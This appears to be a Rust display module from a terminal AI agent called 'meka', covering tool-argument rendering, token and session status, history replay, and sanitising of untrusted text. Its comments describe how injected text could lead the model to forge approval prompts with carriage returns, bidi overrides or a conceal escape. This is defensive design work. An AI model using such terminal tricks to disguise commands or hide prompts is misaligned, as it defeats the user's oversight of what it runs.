    TOOL_PARAM_INDENT.repeat(depth.min(max_depth.max(1)))
}

/// Fit one of meka's own stand-in words into the budget it was given.
///
/// `(no printable text)` is nineteen columns, so emitting it whatever the budget overflows the line
/// by the width of the word describing the value.
fn marker_text(marker: &str, budget: usize) -> String {
    truncate_to_width(marker, budget)
}

/// One-line rendering of a value that needs no block: a scalar, or an empty container.
///
/// An empty string is marked rather than left blank, because `key:` with nothing after it is
/// indistinguishable from a key whose block failed to render.
fn scalar_text(value: &serde_json::Value, budget: usize) -> String {
    match value {
        serde_json::Value::String(text) if text.is_empty() => marker_text("(empty)", budget),
        // Whitespace-only is marked as such rather than as empty. A tab passed as a delimiter is an
        // ordinary argument, and reporting it as `(empty)` is not vague, it is wrong: it says the
        // model sent `""` when it did not. Decided before truncation, since a long run of spaces
        // would otherwise come back as a cut-off blank rather than as nothing at all.
        serde_json::Value::String(text) if text.trim().is_empty() => {
            marker_text("(whitespace)", budget)
        }
        serde_json::Value::String(text) => {
            // Trailing whitespace is trimmed because flattening manufactures it: a value ending in
            // a newline would otherwise leave the key line with an invisible tail.
            let line = elide_to_width(&sanitize_to_line(text, usize::MAX), budget)
                .trim_end()
                .to_string();
            // A value made only of characters meka refuses to display (bidi controls, soft hyphens,
            // zero-width joiners) is not empty and is not whitespace, and leaving it blank would
            // read as a rendering fault rather than as the deliberate omission it is.
            if line.is_empty() {
                marker_text("(no printable text)", budget)
            } else {
                line
            }
        }
        serde_json::Value::Null => marker_text("null", budget),
        serde_json::Value::Object(fields) if fields.is_empty() => marker_text("(empty)", budget),
        serde_json::Value::Array(items) if items.is_empty() => marker_text("(empty)", budget),
        // A number or a bool, which cannot carry an escape but can still be long: serde will print
        // every digit of a 100-digit integer.
        other => truncate_to_width(&other.to_string(), budget),
    }
}

/// The argument block for an `ask` approval prompt: every argument, wrapped rather than cut.
///
/// Separate entry point from the indicator's so the two sets of limits are named at their call
/// sites rather than passed in from the REPL, which has no business knowing them.
pub(crate) fn render_approval_params(input: &serde_json::Value, width: usize) -> Vec<String> {
    render_tool_params(input, width, BlockLimits::approval())
}

/// Split the indicator into its header line and its argument block, per `params`.
///
/// Separate from the printing so the mapping from setting to output is testable; the two are
/// coloured differently, which is why this is a pair rather than one list of lines.
fn tool_indicator_parts(
    name: &str,
    input: &serde_json::Value,
    display_summary: Option<&str>,
    params: ToolParams,
    width: usize,
) -> (String, Vec<String>) {
    match params {
        ToolParams::Off => (tool_header(name, width), Vec::new()),
        ToolParams::Summary => (
            tool_indicator_line(name, input, display_summary, width),
            Vec::new(),
        ),
        // No `(arg)` on the header: the primary parameter is in the block two lines down, and
        // showing it twice is the noise this layout exists to avoid.
        ToolParams::Full => (
            tool_header(name, width),
            render_tool_params(input, width, BlockLimits::indicator()),
        ),
    }
}

/// Render the tool indicator on stderr, at the detail `params` asks for.
pub fn render_tool_indicator(
    name: &str,
    input: &serde_json::Value,
    display_summary: Option<&str>,
    params: ToolParams,
) {
    let (header, block) =
        tool_indicator_parts(name, input, display_summary, params, output_width());
    eprintln!("{}", header.with(Color::Cyan));
    for line in block {
        // A different hue from the header rather than a dimmer shade of it. The normal and bright
        // slots of one colour (4 and 12, 6 and 14) are the same value in a good many terminal
        // themes, so a header/argument split built on brightness renders as no split at all. Grey
        // would separate them but is the colour of a thinking block, which is the neighbour these
        // most need to be told apart from.
        eprintln!("{}", line.with(Color::Blue));
    }
}

/// Match ANSI CSI (Control Sequence Introducer) escapes: `ESC [` followed by parameter bytes
/// (`0x30-0x3F`), optional intermediate bytes (`0x20-0x2F`), and a final byte (`0x40-0x7E`). This
/// covers the sequences an attacker would use to clear the screen, move the cursor, or alter
/// colors.
// Compile-time regex literal; a `Regex::new` failure here means we shipped a typo in the pattern,
// caught on first build.
#[allow(clippy::expect_used)]
static CSI_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\x1b\[[\x30-\x3f]*[\x20-\x2f]*[\x40-\x7e]").expect("static CSI pattern")
});

/// Strip ANSI CSI escapes and C0 control characters (except `\n`, `\r`, `\t`) from a string
/// destined for the user's terminal. Intended for text that originates in untrusted sources (LLM
/// tool arguments, command output echoed into indicators/prompts, etc.) so a hostile or broken
/// string cannot forge UI chrome or corrupt terminal state.
///
/// The sanitized form is for **display only**. The conversation copy sent back to the LLM keeps
/// full fidelity.
pub fn sanitize_for_display(text: &str) -> String {
    let stripped = CSI_PATTERN.replace_all(text, "");
    stripped
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t'))
        .collect()
}

/// Same as [`sanitize_for_display`], but also drops `\r`. For multi-line prose that will be
/// rendered as markdown: streamed assistant text.
///
/// `\r` is excluded because it is the forgery primitive that needs no escape sequence at all. It
/// returns the cursor to column zero without advancing a line, so a model that has read attacker
/// text can overwrite a line meka already printed -- including the tail of an approval prompt --
/// using nothing but ordinary characters. `\n` and `\t` stay: they are structural in markdown and
/// can only move the cursor forward.
///
/// Applying this per delta is sound even though a CSI sequence can straddle a chunk boundary,
/// because the `is_control` filter removes every `\x1b` regardless of what follows it. With no
/// `ESC` reaching the terminal no escape sequence can form, whatever the chunking. The regex is
/// there to remove a *whole* sequence cleanly rather than leaving `[2J` visible in the prose.
///
/// Bidi controls go too, because a bidi override reorders a rendered line without changing a byte
/// of it: an assistant that has read attacker text could make a path or a command read as something
/// else entirely. `char` boundaries are safe per delta because these are single scalars.
///
/// Only the bidi set, unlike [`sanitize_to_line`] and `mcp::sanitize::sanitize_text`, which drop
/// the whole `Cf` category. Those two render *server*-controlled strings into one row of meka's own
/// chrome, where nothing in `Cf` has a legitimate use. This is prose the model wrote for the user,
/// and most of `Cf` is ordinary content there: ZWJ builds emoji families and profession sequences,
/// ZWNJ spells ordinary Persian and Arabic words, and both drive Indic conjuncts. Stripping the
/// category here mangled all of it, and bought nothing, since none of those can reorder a line.
pub fn sanitize_stream_text(text: &str) -> String {
    let stripped = CSI_PATTERN.replace_all(text, "");
    stripped
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\t'))
        .filter(|c| !crate::mcp::sanitize::is_bidi_control(*c as u32))
        .collect()
}

pub fn render_session_id(label: &str, id: &str) {
    eprintln!("{}", format!("{}: {}", label, id).with(Color::DarkGrey));
}

/// Format `rows` into a left-aligned, space-padded column layout, the shared renderer for meka's
/// CLI list tables (`skill list`, `mcp list`, `list`, `scratchpad_list`).
///
/// Each column is widened to its longest cell, the matching header included. Columns are separated
/// by two spaces; the final column is left unpadded so a long trailing value (a path, a URL, a
/// preview) doesn't drag a run of trailing whitespace. The returned string has one trailing newline
/// per line and no extra blank line; the caller picks the stream (`print!` for stdout list
/// commands, or embed it in a tool result).
///
/// (Distinct from the private `format_table`, which lays out *markdown* pipe tables for the
/// streaming renderer.)
///
/// Width is measured in `char`s, which is correct for the ASCII-dominated data meka tabulates
/// (names, versions, UUIDs, timestamps); a CJK-heavy cell would pad slightly short. No caller hits
/// that today.
pub fn format_columns(headers: &[&str], rows: &[Vec<String>]) -> String {
    if headers.is_empty() {
        return String::new();
    }

    let mut widths: Vec<usize> = headers.iter().map(|h| h.chars().count()).collect();
    for row in rows {
        for (index, cell) in row.iter().take(widths.len()).enumerate() {
            widths[index] = widths[index].max(cell.chars().count());
        }
    }

    let mut out = format_columns_row(headers, &widths);
    for row in rows {
        let cells: Vec<&str> = row.iter().map(String::as_str).collect();
        out.push_str(&format_columns_row(&cells, &widths));
    }
    out
}

fn format_columns_row(cells: &[&str], widths: &[usize]) -> String {
    use std::fmt::Write as _;

    let mut line = String::new();
    let last = cells.len().saturating_sub(1);
    for (index, cell) in cells.iter().enumerate() {
        if index == last {
            // Final column: never padded; nothing follows it.
            line.push_str(cell);
        } else {
            let width = widths.get(index).copied().unwrap_or(0);
            let _ = write!(line, "{:<w$}  ", cell, w = width);
        }
    }
    line.push('\n');
    line
}

pub fn render_hint(message: &str) {
    eprintln!("{}", message.with(Color::DarkGrey));
}

pub(crate) fn format_token_count(n: u64) -> String {
    if n < 1_000 {
        n.to_string()
    } else if n < 1_000_000 {
        format!("{:.1}k", (n as f64) / 1_000.0)
    } else {
        format!("{:.1}M", (n as f64) / 1_000_000.0)
    }
}

/// Print a one-line per-turn token-usage summary to stderr in dark grey, preceded by a blank line
/// so it visually separates from the agent's response. Format: `[in 12.3k / cache hit 96% / out
/// 1.2k]`. The "in" column is the total of all three input-token tiers (live, cache-write,
/// cache-read); the cache-hit % is `cache_read / total_in`. Numbers below 1k show as raw counts,
/// below 1M as `Nk`, and otherwise as `NM`, each with one decimal.
pub fn render_token_usage(usage: &crate::provider::TokenUsage) {
    let total_in = usage
        .input_tokens
        .saturating_add(usage.cache_creation_input_tokens)
        .saturating_add(usage.cache_read_input_tokens);
    let cache_hit_pct = if total_in == 0 {
        0
    } else {
        ((usage.cache_read_input_tokens as f64) / (total_in as f64) * 100.0).round() as u64
    };
    eprintln!();
    eprintln!(
        "{}",
        format!(
            "[in {} / cache hit {}% / out {}]",
            format_token_count(total_in),
            cache_hit_pct,
            format_token_count(usage.output_tokens),
        )
        .with(Color::DarkGrey)
    );
}

/// The resolved model parameters shown at the top of the `/status` report, borrowed from the active
/// config plus the provider's settled effort. All optional so a mis-selected profile still renders.
pub struct ModelStatus<'a> {
    pub model: Option<&'a str>,
    /// Active profile name (e.g. `claude-max`).
    pub profile: Option<&'a str>,
    /// Backend type (e.g. `claude-subscription`).
    pub backend: Option<&'a str>,
    /// The reasoning effort sent on the wire, or `None` when the request sends none.
    pub effort: Option<&'a str>,
    pub thinking: crate::provider::ThinkingMode,
}

/// The body of the session-status block, without ANSI and without the header line.
///
/// Split out because every non-REPL frontend needs the same numbers in a different envelope; with
/// no shared body each re-implements the formatting and they drift. Pairs with
/// [`render_session_status`], which is this plus the coloured header, printed. The same shape as
/// [`format_account_usage`] / [`render_account_usage`], for the same reason.
pub fn format_session_status(
    snap: &crate::stats::SessionStatsSnapshot,
    model: &ModelStatus,
    message_count: usize,
    context_tokens: u64,
    context_window: u64,
) -> String {
    use std::fmt::Write as _;

    let total_in = snap.total_input_tokens();
    let mut out = String::new();
    // Ordered like the profile these lines are resolved from: the backend first, then the model,
    // then the model-tied knobs in the order `[providers.<name>]` declares them (`context_window`,
    // `effort`, `thinking`). Reading the block next to the config it came from is the whole point
    // of this command, and the two disagreeing on order made that harder than it needed to be. The
    // cumulative counters follow, and answer a different question.
    match (model.profile, model.backend) {
        (Some(profile), Some(backend)) => {
            let _ = writeln!(out, "  Provider:        {} ({})", profile, backend);
        }
        (None, Some(backend)) => {
            let _ = writeln!(out, "  Provider:        {}", backend);
        }
        _ => {}
    }
    if let Some(name) = model.model {
        let _ = writeln!(out, "  Model:           {}", name);
    }
    // Live context occupancy: how full the window was on the last request. Distinct from the
    // cumulative "Input tokens" total below, which sums every turn's usage for the whole session.
    //
    // Shown from turn zero, at `0 / <window>`, rather than waiting for occupancy to be non-zero.
    // The window is the profile's `context_window` or a documented default, and meka neither probes
    // for it nor checks it against the model, which makes this the only place a user can confirm
    // the number their session budgets against. Getting it wrong is otherwise invisible until
    // compaction misbehaves several turns in.
    if context_window > 0 {
        let pct = ((context_tokens as f64 / context_window as f64) * 100.0).round() as u64;
        let remaining = context_window.saturating_sub(context_tokens);
        let _ = writeln!(
            out,
            "  Context:         {} / {} ({}% used, {} left)",
            format_token_count(context_tokens),
            format_token_count(context_window),
            pct,
            format_token_count(remaining),
        );
    }
    if let Some(effort) = model.effort {
        let _ = writeln!(out, "  Effort:          {}", effort);
    }
    // Anthropic-only, and omitted elsewhere for the same reason `Effort` is omitted when unset: a
    // status block should report what the request carries, and `thinking` is not a field an OpenAI
    // request has. Naming an encoding there would read as a setting that is in force.
    if model
        .backend
        .is_some_and(crate::provider::backend_takes_thinking)
    {
        let _ = writeln!(out, "  Thinking:        {}", model.thinking.as_str());
    }
    let _ = writeln!(out, "  Turns:           {}", snap.turns);
    let _ = writeln!(
        out,
        "  Input tokens:    {}  (cache hit: {}%)",
        format_token_count(total_in),
        snap.cache_hit_pct()
    );
    let _ = writeln!(
        out,
        "  Output tokens:   {}",
        format_token_count(snap.output_tokens)
    );
    if snap.redactions > 0 {
        let _ = writeln!(
            out,
            "  Redactions:      {} ({} image{}, ~{} MiB freed)",
            snap.redactions,
            snap.redacted_images,
            if snap.redacted_images == 1 { "" } else { "s" },
            snap.redacted_bytes / 1_048_576,
        );
    } else {
        let _ = writeln!(out, "  Redactions:      0");
    }
    let _ = writeln!(out, "  Messages:        {}", message_count);
    out
}

/// Print the session-status block to stderr, header included. See [`format_session_status`].
pub fn render_session_status(
    snap: &crate::stats::SessionStatsSnapshot,
    model: &ModelStatus,
    message_count: usize,
    context_tokens: u64,
    context_window: u64,
) {
    render_heading("Session status");
    eprint!(
        "{}",
        format_session_status(snap, model, message_count, context_tokens, context_window)
    );
}

/// Plain-text (no ANSI) rendering of account rate-limit usage, shared by the REPL/ACP `/usage`
/// command and the `meka account usage` CLI. Kept ANSI-free so the CLI can pipe it into scripts
/// unchanged; the trailing newline lets callers `print!`/`eprint!` it directly.
pub fn format_account_usage(usage: &crate::provider::AccountUsage) -> String {
    use std::fmt::Write as _;
    let mut out = String::from("Account usage\n");
    if usage.windows.is_empty() {
        out.push_str("  (no usage windows reported)\n");
    }
    for window in &usage.windows {
        let percent = window.used_percent.clamp(0.0, 100.0);
        let reset = window
            .resets_at
            .map(format_reset_time)
            .map(|when| format!("  (resets {when})"))
            .unwrap_or_default();
        let _ = writeln!(
            out,
            "  {:<18} {} {:>3}% used{}",
            window.label,
            usage_bar(percent),
            percent.round() as u64,
            reset,
        );
    }
    if let Some(extra) = &usage.extra_usage
        && let Some(line) = format_extra_usage(extra)
    {
        let _ = writeln!(out, "  Extra usage: {line}");
    }
    if let Some(note) = &usage.note {
        let _ = writeln!(out, "  {note}");
    }
    out
}

/// One-line summary of extra-usage / credits state, or `None` when there's nothing worth showing
/// (disabled with no balance and nothing spent).
fn format_extra_usage(extra: &crate::provider::ExtraUsage) -> Option<String> {
    let has_data =
        extra.enabled || extra.used.is_some_and(|used| used > 0.0) || extra.balance.is_some();
    if !has_data {
        return None;
    }
    let mut parts = vec![if extra.enabled { "enabled" } else { "disabled" }.to_string()];
    if let Some(utilization) = extra.utilization {
        parts.push(format!("{}% used", utilization.round() as i64));
    }
    if let Some(used) = extra.used {
        parts.push(format!(
            "{} spent",
            format_money(used, extra.currency.as_deref())
        ));
    }
    if let Some(balance) = extra.balance {
        parts.push(format!(
            "{} balance",
            format_money(balance, extra.currency.as_deref())
        ));
    }
    Some(parts.join(" · "))
}

/// Format a monetary amount: `$3.00` for USD/unknown, `3.00 EUR` otherwise.
fn format_money(amount: f64, currency: Option<&str>) -> String {
    match currency {
        Some("USD") | None => format!("${amount:.2}"),
        Some(other) => format!("{amount:.2} {other}"),
    }
}

/// REPL `/usage` rendering: the shared plain text to stderr (REPL UI feedback). The "not available"
/// case is handled by the caller via `render_hint`.
pub fn render_account_usage(usage: &crate::provider::AccountUsage) {
    eprint!("{}", format_account_usage(usage));
}

/// A fixed-width `[####------]` gauge for a 0-100 percentage.
fn usage_bar(percent: f64) -> String {
    const CELLS: usize = 10;
    let filled = ((percent / 100.0) * CELLS as f64).round() as usize;
    let filled = filled.min(CELLS);
    let mut bar = String::with_capacity(CELLS + 2);
    bar.push('[');
    for cell in 0..CELLS {
        bar.push(if cell < filled { '#' } else { '-' });
    }
    bar.push(']');
    bar
}

/// Format a non-negative duration in seconds compactly, e.g. `2d 3h`, `4h 12m`, `45m`, `30s`. Used
/// by `meka account whoami` for the token time-to-expiry.
pub(crate) fn format_duration_short(seconds: i64) -> String {
    let seconds = seconds.max(0);
    let minutes = seconds / 60;
    if minutes >= 24 * 60 {
        format!("{}d {}h", minutes / (24 * 60), (minutes % (24 * 60)) / 60)
    } else if minutes >= 60 {
        format!("{}h {}m", minutes / 60, minutes % 60)
    } else if minutes >= 1 {
        format!("{minutes}m")
    } else {
        format!("{seconds}s")
    }
}

/// Format a reset instant (Unix seconds) as "relative, local clock", e.g. "in 4h 12m, 2026-07-02
/// 02:10". Falls back to a plain clock when the timestamp is in the past or unparseable. Shared
/// with the ACP `/usage` text builder.
pub(crate) fn format_reset_time(epoch_seconds: i64) -> String {
    let Some(when) = chrono::DateTime::from_timestamp(epoch_seconds, 0) else {
        return "unknown".to_string();
    };
    let clock = when.with_timezone(&chrono::Local).format("%Y-%m-%d %H:%M");
    let minutes = when.signed_duration_since(chrono::Utc::now()).num_minutes();
    if minutes <= 0 {
        return format!("now, {clock}");
    }
    let relative = if minutes >= 24 * 60 {
        format!(
            "in {}d {}h",
            minutes / (24 * 60),
            (minutes % (24 * 60)) / 60
        )
    } else if minutes >= 60 {
        format!("in {}h {}m", minutes / 60, minutes % 60)
    } else {
        format!("in {minutes}m")
    };
    format!("{relative}, {clock}")
}

/// Print a single-line CLI error to stderr in the project's standard format.
pub fn render_error(error: &dyn std::fmt::Display) {
    eprintln!("{} {}", "Error:".with(Color::Red), error);
}

/// The heading above a block of command output, in the colour every other one uses.
///
/// Exists so the colour is decided once. `Session status` had it inline, and the second heading to
/// want it would otherwise have copied the constant rather than the convention.
pub fn render_heading(heading: &str) {
    eprintln!("{}", heading.with(Color::Cyan));
}

/// A stage direction about the output rather than output of its own: `(interrupted)`.
///
/// Yellow, not red. None of these is a failure -- an interrupt is the user's own doing, and the
/// background-task notices describe meka doing as it was asked. [`Color::Red`] belongs to
/// [`render_error`] alone, and is worth keeping at one meaning. Yellow already carries "worth
/// noticing, nothing went wrong" here: it is the `read` permission indicator and an in-progress
/// todo. Not [`Color::DarkGrey`] either, which is the right *class* but is what thinking blocks
/// use, and the mark saying an answer is incomplete should not recede as far as the model's
/// musings -- spotting it in scrollback is the whole point, since at the time you already knew.
///
/// Parenthesised and lowercase because it annotates the transcript rather than speaking:
/// `Interrupted.` reads as meka saying something, `(interrupted)` as a note on the answer that
/// stopped, in the same register as `(truncated)`.
///
/// Every caller passes one of meka's own strings, so there is nothing here to sanitise.
pub fn render_annotation(note: &str) {
    eprintln!("{}", format!("({})", note).with(Color::Yellow));
}

/// A session whose recorded provider profile is not one the config has, and a profile it could be
/// moved to, for [`render_provider_setup_hint`].
///
/// The caller establishes both facts before building this. The hint is only right when the row's
/// own profile is what could not be resolved: it would otherwise send a user whose profile is
/// merely missing its credential to repin a session that is bound exactly where it belongs. And
/// there has to be somewhere to move it, so a config with no profiles at all gets the generic
/// example instead of a command with nothing to put in it.
pub struct MissingSessionProfile<'a> {
    /// The session `--provider` would repin, which is the only thing that can rewrite the binding.
    pub session_id: uuid::Uuid,
    /// The configured profile to suggest moving to.
    pub move_to: &'a str,
}

/// Print the provider-setup hint shown when the agent fails to initialize. Centralized so the
/// wording stays in sync everywhere.
///
/// **One line, because the error printed above it has already said everything else.**
/// `provider::look_up_profile` names the profile the row wants, lists the configured ones, and
/// tells the reader to restore it or move off it. The session id is the single fact it cannot
/// reach, and `-r <id> --provider <name>` is the only command that rewrites a row's binding, so
/// that is what this adds. Two further lines are deliberately absent. `Run meka provider list to
/// see configured profiles` restates what that error has just listed, and `Or bring the profile
/// back: meka provider add <recorded> --type ... --model ...` *invents the profile's type and
/// model*. meka never saw the deleted profile; it may have been `openai-responses` on another model
/// entirely, and running that line would create a different profile under the name the session
/// wants. A wrong command is worse than no command.
///
/// `None` says nothing about *why* setup failed: the caller prints the error first, and it is as
/// often a configured profile missing its credential as no profile at all. That case names no
/// profile in its example either, because a literal name reads as a fact about the user's config
/// rather than as a placeholder: `work` was hardcoded, so a user missing `ghost` was told to add
/// `work`, and a user who already had a `work` profile was told to add one that existed. The type
/// and model there are safe where the interpolated ones were not, because the line is labelled
/// `Example:` and describes nothing that exists.
pub fn render_provider_setup_hint(missing: Option<MissingSessionProfile<'_>>) {
    match missing {
        Some(missing) => eprintln!(
            "Move this session onto a configured profile: meka -r {} --provider {}",
            missing.session_id, missing.move_to
        ),
        None => {
            eprintln!(
                "Example: meka provider add <name> --type claude-subscription --model claude-opus-5"
            );
            eprintln!("Run `meka provider list` to see configured profiles.");
        }
    }
}

/// Walk backwards through `messages` and return the suffix that starts at the `n`th most recent
/// user turn. A "turn" begins at a User-role message whose content is not purely `ToolResult`
/// blocks, i.e. an actual user prompt, not an agent-driven tool result echoed back as a User
/// message. `n == 0` or no qualifying turns returns an empty slice.
pub fn last_n_turns(
    messages: &[crate::provider::Message],
    n: usize,
) -> &[crate::provider::Message] {
    if n == 0 || messages.is_empty() {
        return &[];
    }
    // Walk backwards, tracking the earliest qualifying boundary seen so far. If we hit `n`
    // boundaries we stop there; if we exhaust the slice without reaching `n`, we return everything
    // from the earliest boundary we did find (so `N=999` on a 2-turn session still returns both
    // turns, not an empty slice).
    let mut seen = 0usize;
    let mut earliest_boundary: Option<usize> = None;
    for (index, message) in messages.iter().enumerate().rev() {
        if is_user_prompt_boundary(message) {
            seen += 1;
            earliest_boundary = Some(index);
            if seen == n {
                break;
            }
        }
    }
    match earliest_boundary {
        Some(start) => &messages[start..],
        None => &[],
    }
}

/// True when `message` is the start of a new turn from the user's perspective: Role::User with at
/// least one non-`ToolResult` block.
fn is_user_prompt_boundary(message: &crate::provider::Message) -> bool {
    use crate::provider::{ContentBlock, Role};
    if !matches!(message.role, Role::User) {
        return false;
    }
    message
        .content
        .iter()
        .any(|block| !matches!(block, ContentBlock::ToolResult { .. }))
}

/// Knobs for [`render_message_history`]. Mirrors the fields the live REPL reads off
/// `ResolvedConfig` so resumed/dumped history matches what the user sees during a live turn.
pub struct HistoryRenderOptions {
    pub render_mode: RenderMode,
    pub show_thinking: bool,
    /// Mirrors `[display].tool_params`, so a replayed tool call carries the same detail the live
    /// one did.
    pub tool_params: ToolParams,
    pub input_style: nu_ansi_term::Style,
    /// Blank line before each user prompt (mirrors `[display].newline_before_prompt`).
    pub newline_before_prompt: bool,
    /// Blank line after each user prompt (mirrors `[display].newline_after_prompt`). Acts as the
    /// visual separator between the prompt and the agent's first response block.
    pub newline_after_prompt: bool,
}

/// Reprint a slice of historical messages styled to match the live REPL output. Inter-block spacing
/// flows through [`OutputSpacing`] (the same state machine the live loop uses) so transitions like
/// tool-indicator → text get a blank line; user-prompt spacing follows the `newline_before_prompt`
/// / `newline_after_prompt` config flags just like the live REPL.
///
/// Returns whether anything reached the terminal. A slice can render to nothing (it is empty, or it
/// holds only tool results and blank text), and the caller has to know: its own blank lines bracket
/// this output, and bracketing nothing leaves a gap that reads as a rendering fault.
pub fn render_message_history(
    messages: &[crate::provider::Message],
    opts: &HistoryRenderOptions,
) -> bool {
    use crate::provider::{ContentBlock, Role};
    if messages.is_empty() {
        return false;
    }
    let mut spacing = OutputSpacing::new();
    // The caller (e.g. the `/history` dispatch) is expected to emit the leading blank, the
    // equivalent of the live REPL's `newline_after_prompt`, between its own command line and this
    // rendered history. So the very first user prompt we render must skip its own
    // `newline_before_prompt` to avoid stacking blanks. Once anything has been emitted, the inner
    // spacing rules take over and turn-to-turn transitions get their own blanks naturally.
    let mut emitted_any = false;
    for message in messages {
        for block in &message.content {
            match block {
                ContentBlock::Text { text } => match message.role {
                    Role::Assistant => {
                        if text.trim().is_empty() {
                            continue;
                        }
                        if spacing.before_text() {
                            eprintln!();
                        }
                        render_assistant_text(text, opts.render_mode);
                        emitted_any = true;
                    }
                    Role::User => {
                        let leading_blank = opts.newline_before_prompt && emitted_any;
                        if !render_user_prompt(text, opts.input_style, leading_blank) {
                            continue;
                        }
                        if opts.newline_after_prompt {
                            eprintln!();
                        }
                        spacing.after_prompt();
                        emitted_any = true;
                    }
                },
                // Input images (from an ACP client) have no terminal rendering; show a marker so a
                // replayed/exported transcript notes the attachment instead of dropping it
                // silently.
                ContentBlock::Image { .. } => {
                    if spacing.before_text() {
                        eprintln!();
                    }
                    eprintln!("[image]");
                    emitted_any = true;
                }
                ContentBlock::Thinking { thinking, .. } => {
                    if opts.show_thinking && !thinking.trim().is_empty() {
                        if spacing.before_thinking() {
                            eprintln!();
                        }
                        render_thinking_block(thinking, true);
                        emitted_any = true;
                    }
                }
                ContentBlock::RedactedThinking { .. } => {
                    if opts.show_thinking {
                        if spacing.before_thinking() {
                            eprintln!();
                        }
                        render_thinking_block("[redacted thinking]", true);
                        emitted_any = true;
                    }
                }
                ContentBlock::ToolUse { name, input, .. } => {
                    if spacing.before_tool_indicator(opts.tool_params) {
                        eprintln!();
                    }
                    render_tool_indicator(name, input, None, opts.tool_params);
                    emitted_any = true;
                }
                // Tool results are intentionally hidden; the live REPL doesn't echo them either,
                // so showing them in history would be a fidelity regression. The user sees the tool
                // indicator (above) and whatever the assistant's next text block says about the
                // result.
                ContentBlock::ToolResult { .. } => {}
            }
        }
    }
    emitted_any
}

fn render_assistant_text(text: &str, render_mode: RenderMode) {
    // Caller has already emitted the leading blank line (via `OutputSpacing::before_text`) when
    // needed, and verified the text is non-empty. We just stream the markdown, no trailing blank,
    // because the next block's `before_*` will add one if appropriate.
    let mut renderer = StreamingRenderer::new(render_mode);
    if let Err(error) = renderer.push_delta(text) {
        tracing::debug!("history: failed to render assistant delta: {}", error);
    }
    if let Err(error) = renderer.finish() {
        tracing::debug!("history: failed to finish assistant render: {}", error);
    }
}

/// Render a user prompt with the cyan `>` gutter plus `input_style` applied to each line,
/// optionally preceded by a blank line. Returns `false` when the prompt was empty (after
/// `strip_context_tags`) and nothing was emitted, so the caller can skip the after-prompt
/// blank/state update.
fn render_user_prompt(text: &str, input_style: nu_ansi_term::Style, newline_before: bool) -> bool {
    let stripped = crate::session::strip_context_tags(text);
    let trimmed = stripped.trim();
    if trimmed.is_empty() {
        return false;
    }
    if newline_before {
        eprintln!();
    }
    for line in trimmed.lines() {
        // Sanitised like the assistant text a few lines above. "User" here names the *role*, not
        // necessarily a person at this terminal: an ACP or HTTP client wrote it, or a `--skill`
        // body did, and a replayed session shows whatever the row holds. Leaving it raw made the
        // one message class meka replays without filtering the one an attacker controls end to end.
        eprintln!(
            "{} {}",
            ">".with(Color::Cyan),
            input_style.paint(sanitize_stream_text(line))
        );
    }
    true
}

/// Whether a live, redrawn-in-place indicator can be shown at all.
///
/// Callers gate their whole indicator path on this rather than relying on the drawer's own check:
/// drawing is only the last step, and the steps before it (closing a text run, claiming a blank
/// line from [`OutputSpacing`]) are shared state that must not move for output that will never
/// appear. Piping a run through `cat` otherwise gained a stray blank line per thinking block.
pub fn live_indicator_supported() -> bool {
    std::io::IsTerminal::is_terminal(&std::io::stderr())
}

/// Draw the live thinking indicator in place, returning whether anything was drawn.
///
/// Redraws overwrite each other, but the *last* draw is normally kept: the caller commits it with a
/// newline when the thinking phase ends, so the record of what the model spent survives in
/// scrollback the way a visible thinking block does. It is erased only when a thinking block with
/// real text is about to replace it.
///
/// Returns `false` without drawing when stderr is not a terminal. Redrawing in place needs a
/// terminal that honours a carriage return; redirected to a file this would accumulate one line per
/// token estimate.
///
/// Redraws by returning to column zero, writing the label, and clearing to the end of the line --
/// not by overwriting the previous label's width. The label does not grow monotonically with the
/// count (`format_token_count` switches to `M` at a million, so `1000.0k tokens` is *wider* than
/// `1.0M tokens`), so a width-tracking erase would strand the tail of a longer previous draw.
/// Clearing to the line end makes that class of bug unrepresentable.
///
/// Written with no trailing newline, so the cursor stays parked on the line for the next redraw or
/// erase.
pub fn render_thinking_indicator(estimated_tokens: Option<u64>) -> bool {
    use std::io::IsTerminal;
    if !std::io::stderr().is_terminal() {
        return false;
    }
    let label = match estimated_tokens {
        Some(tokens) => format!("Thinking... ({} tokens)", format_token_count(tokens)),
        // No estimate yet: the block has only just opened. The bare word is still worth drawing --
        // it is the difference between a wait the user can interpret and one they cannot.
        None => "Thinking...".to_string(),
    };
    // One `execute!`, so a redraw cannot be torn between the carriage return and the text.
    crossterm::execute!(
        std::io::stderr(),
        crossterm::cursor::MoveToColumn(0),
        crossterm::style::Print(label.as_str().with(Color::DarkGrey)),
        crossterm::terminal::Clear(crossterm::terminal::ClearType::UntilNewLine),
    )
    .is_ok()
}

/// Discard whatever an in-place status line left on the current row, so the caller starts at column
/// zero.
///
/// Two writers park the cursor mid-row without a newline: the thinking indicator, and the MCP
/// progress line, which is `\r[mcp:server/tool] ...` and server-controlled. Anything printed next
/// continues that row. For an approval prompt that is the whole ballgame -- `[ask] Shell` appended
/// to a server's progress text reads as one line, and the rule the rest of this file is built on is
/// that meka's own chrome starts at column zero.
pub(crate) fn begin_own_line() {
    use std::io::IsTerminal;
    if !std::io::stderr().is_terminal() {
        return;
    }
    if let Err(error) = write_own_line_prelude(&mut std::io::stderr()) {
        // A broken pipe or closed terminal. Nothing to recover: the line is cosmetic and the caller
        // has already dropped its state.
        tracing::debug!("failed to clear the status line: {}", error);
    }
}

/// The sequence [`begin_own_line`] writes. Split out so a test can read it: the function itself
/// returns early off a tty, which is every test process.
fn write_own_line_prelude(out: &mut impl std::io::Write) -> std::io::Result<()> {
    crossterm::queue!(
        out,
        // Attributes first, and load-bearing rather than tidy. `Clear(UntilNewLine)` is `ESC[K`,
        // which erases *using the current attributes*, so a model-controlled `ESC[8m` (conceal)
        // that reached the terminal survives the clear and everything meka prints next is
        // invisible -- including the `[ask]` prompt this is called to make legible.
        // crossterm's `PrintStyledContent` does not close the gap either: it resets only
        // the foreground.
        crossterm::style::ResetColor,
        crossterm::style::SetAttribute(crossterm::style::Attribute::Reset),
        crossterm::cursor::MoveToColumn(0),
        crossterm::terminal::Clear(crossterm::terminal::ClearType::UntilNewLine),
    )?;
    out.flush()
}

/// Rows one line of a fully-shown thinking block may wrap to before it is cut.
///
/// A bound rather than a promise of completeness: reasoning carrying a minified blob would
/// otherwise spend a screen on one line.
const THINKING_MAX_ROWS_PER_LINE: usize = 20;

